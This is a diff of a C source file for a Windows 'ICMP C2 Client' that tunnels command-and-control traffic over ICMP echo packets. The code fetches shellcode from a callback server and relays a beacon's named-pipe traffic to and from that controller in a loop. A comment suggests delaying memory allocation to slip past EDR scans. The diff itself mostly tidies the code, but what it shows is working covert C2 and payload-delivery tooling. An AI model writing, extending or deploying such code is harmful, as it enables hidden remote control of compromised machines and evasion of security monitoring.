@@ -10,8 +10,6 @@
 #include <winsock2.h>
 #include <windows.h>
 
-
-
 ///////////////////////////////////////////////////////////////////////
 //// Client Settings
 /*
@@ -113,6 +111,10 @@ int received_chunks = 0;
 int total_chunks = 0;
 int received_map[1000]; // track received fragments (max 1000)
 
+///////////////////////////////////////////////////////////////////////
+//// Beacon Funcs
+///////////////////////////////////////////////////////////////////////
+
 // Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
     printf("[+] Reading Frame\n");
@@ -138,6 +140,11 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 	WriteFile(my_handle, buffer, length, &wrote, NULL);
 }
 
+///////////////////////////////////////////////////////////////////////
+//// Transfer Funcs
+///////////////////////////////////////////////////////////////////////
+
+
 //
 // send_icmp: send a single ICMP Echo Request (Type=8) with a custom sequence.
 // Arguments:
@@ -147,7 +154,6 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 //   payload_len  = total length of `payload` (must be ≤ ICMP_PAYLOAD_SIZE)
 //   seq_num      = sequence number to include (0 for “size” packet, 1..N for data chunks)
 //
-
 int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num) {
     // Calculate exact ICMP packet length: header + payload, this is a patched version that does not send the whole payload size as 0's for buffer.
     int icmp_packet_len = sizeof(struct icmp_header) + payload_len;
@@ -434,6 +440,10 @@ char* recv_icmp(SOCKET s, uint32_t *out_len) {
     return out_data;
 }
 
+///////////////////////////////////////////////////////////////////////
+//// Bridge/Go Function
+///////////////////////////////////////////////////////////////////////
+
 //
 // bridge_to_beacon: high-level flow
 //   1) Create raw ICMP socket
@@ -450,43 +460,13 @@ int bridge_to_beacon() {
         return 1;
     }
 
-    // Optional: set recv timeout so we don’t block forever
-    //    int timeout_ms = 5000; // 5 seconds
-    //    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
-
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
 
-    //get payload
-    // 1) Build “seq=0” size packet
-    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
-    // uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
-    // uint32_t netlen = htonl(expected_server_payload);
-
     ///////////////////////////////////////////////////////////////////////
     //// ASK for payload, by includin PAYLOAD in data
     ///////////////////////////////////////////////////////////////////////
-    // self.ts_send_frame(b"arch=x86")
-    // self.ts_send_frame(b"pipename=foobar")
-    // self.ts_send_frame(b"block=100")
-    // self.ts_send_frame(b"go")
-
-    
-    // char size_buf[ICMP_PAYLOAD_SIZE] = { 0 }; //buffer for copying PAYLOAD into
-    // const char marker[] = "PAYLOAD";
-    // memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-    // memcpy(size_buf + TAG_SIZE, marker, sizeof(marker) - 1);
-    // // sizeof(marker)-1 == 7, so total bytes = 4 + 7 = 11
-    // int size_payload_len = TAG_SIZE + (sizeof(marker) - 1);
-
-    // // Send seq=0 Echo Request
-    // if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-    //     printf("[-] Failed to send seq=0 packet\n");
-    //     closesocket(s);
-    //     return 0;
-    // }
-
     const char *ts_cmds[] = {
         "I WANT A PAYLOAD"
     };
@@ -498,31 +478,8 @@ int bridge_to_beacon() {
             int total_len = (int)strlen(cmd);
 
             send_icmp_fragments(s, &dest, cmd, total_len);
-            Sleep(1000);
+            Sleep(SLEEP_TIME);
         }
-
-
-    //     const char *cmd = ts_cmds[i];
-    //     int cmd_len = (int)strlen(cmd);
-
-    //     // Build ICMP payload: [TAG][command string]
-    //     char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-    //     memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-    //     memcpy(size_buf + TAG_SIZE, cmd, cmd_len);
-
-    //     int size_payload_len = TAG_SIZE + cmd_len;
-    //     printf("[+] Sending seq=0 with command: %s\n", cmd);
-
-    //     // Send seq=0 Echo Request
-    //     if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-    //         printf("[-] Failed to send seq=0 packet for command: %s\n", cmd);
-    //         closesocket(s);
-    //         return 0;
-    //     }
-
-    //     // Optional: small delay between commands
-    //     Sleep(100);
-    // }
 
     ///////////////////////////////////////////////////////////////////////
     ////  Wait for and reassemble all fragments (Echo Replies)
@@ -536,16 +493,8 @@ int bridge_to_beacon() {
         return 0;
     }
 
-    
     printf("[+] Received full payload: %u bytes\n", shellcode_len);
     printf("    First 256 bytes as string: %.256s\n", shellcode);
-    //Grab payload over ICMP Bridge
-    //char * shellcode = get_payload(s);
-    // if (!shellcode) {
-    //     fprintf(stderr, "[-] get_payload failed, exiting.\n");
-    //     exit(EXIT_FAILURE);
-    // }
-    //unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
 
     //could do some sneaky stuff here, make it sleep for X seconds before allocating memory to
     //potentially avoid an EDR mem scan
@@ -619,9 +568,8 @@ int bridge_to_beacon() {
             printf("[*] CreateFileA still invalid (err=%u), retrying...\n", err);
         }
     }
-    //printf("[+] Connected to pipe = %p\n", handle_beacon);
 
-    printf("[+] Allocating Pipe buffer\n");
+    printf("[+] Allocating Pipe buffer\n"); // max data we can read from the pipe
     char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
     if (!pipe_buffer) {
         DWORD err = GetLastError();
@@ -636,44 +584,24 @@ int bridge_to_beacon() {
     /////////////////////////////////////////////////////////////////////
     printf("[+] Starting beacon read loop\n");
     while (TRUE) {
-        // 1) Read any data the Beacon has written into the named pipe.
-        //    read_frame returns the number of bytes read, or 0 if no data.
-
-        //I think the problem is that the pipe has no data, and as such bugs out the logic
+        //Read beacon frame from pipe
         DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
-
         int total_len = (int)beacon_output;
-        // if (total_len <= 0) {
-        //     printf("Waiting for data to pipe...");
-        //     // no data to send, skip ICMP entirely
-        //     Sleep(SLEEP_TIME);
-        //     continue;
-        // }
 
-        // DWORD bytes_avail = 0;
-        // PeekNamedPipe(handle_beacon, NULL, 0, NULL, &bytes_avail, NULL);
-        // if (bytes_avail < 4) {
-        //     // Not enough to even read the 4-byte length header—sleep and continue
-        //     Sleep(SLEEP_TIME);
-        //     continue;
-        // }
-        // Now it’s safe to call read_frame().
-        // DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
-
+        //chunk send it back to server
         send_icmp_fragments(s, &dest, pipe_buffer, total_len);
 
         printf("[+] Getting data from controller (possibly multi‐packet)\n");
         uint32_t controller_len = 0;
 
-        //uint32_t controller_len = 0;
+        //Grab the response
         char *controller_resp = recv_icmp_fragments(s, &controller_len);
         if (controller_resp) {
             write_frame(handle_beacon, controller_resp, controller_len);
             free(controller_resp);
         }
 
-        // 6) Sleep a short time before looping again.
-        //    This prevents a tight spin if there’s no new pipe data or controller replies.
+        // Sleep before looping again
         Sleep(SLEEP_TIME);
     }
     // Cleanup
@@ -699,7 +627,7 @@ void debug_constants() {
 int main() {
     printf("[+] ICMP C2 Client Starting...\n");
     debug_constants();
-	/* initialize winsock */
+	// init sock
 	WSADATA wsaData;
 	WORD    wVersionRequested;
 	wVersionRequested = MAKEWORD(2, 2);
